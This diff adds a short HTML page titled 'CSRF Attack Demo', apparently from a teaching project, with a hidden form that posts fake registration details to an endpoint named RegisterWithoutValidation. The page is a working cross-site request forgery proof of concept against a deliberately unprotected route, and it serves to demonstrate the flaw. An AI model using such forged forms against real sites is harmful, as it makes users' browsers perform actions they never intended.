@@ -1,0 +1,12 @@
+﻿<!DOCTYPE html>
+<html>
+<body>
+    <h1>CSRF Attack Demo</h1>
+    <form action="~/User/RegisterWithoutValidation" method="post">
+        <input type="hidden" name="Name" value="Hacker" />
+        <input type="hidden" name="Email" value="hacker@example.com" />
+        <input type="hidden" name="Password" value="password" />
+        <button type="submit">Submit CSRF Attack</button>
+    </form>
+</body>
+</html>
